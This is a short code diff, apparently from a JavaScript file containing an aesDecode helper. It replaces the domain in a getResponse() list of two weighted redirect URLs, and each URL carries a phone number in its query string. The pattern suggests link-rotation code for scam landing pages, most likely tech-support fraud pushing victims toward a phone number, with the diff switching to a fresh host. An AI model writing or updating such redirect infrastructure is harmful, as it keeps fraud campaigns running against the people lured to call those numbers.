@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://Aether-Style.on-forge.com/werrx01USAHTML/?bcda=+65 653-106-3088", weight: 0.5 },
-        { url: "https://Aether-Style.on-forge.com/werrx01USAHTML/?bcda=+65 800 852 3109", weight: 0.5 }
+        { url: "https://Crimson-Loop.on-forge.com/werrx01USAHTML/?bcda=+65 653-106-3088", weight: 0.5 },
+        { url: "https://Crimson-Loop.on-forge.com/werrx01USAHTML/?bcda=+65 800 852 3109", weight: 0.5 }
       
     ];
 
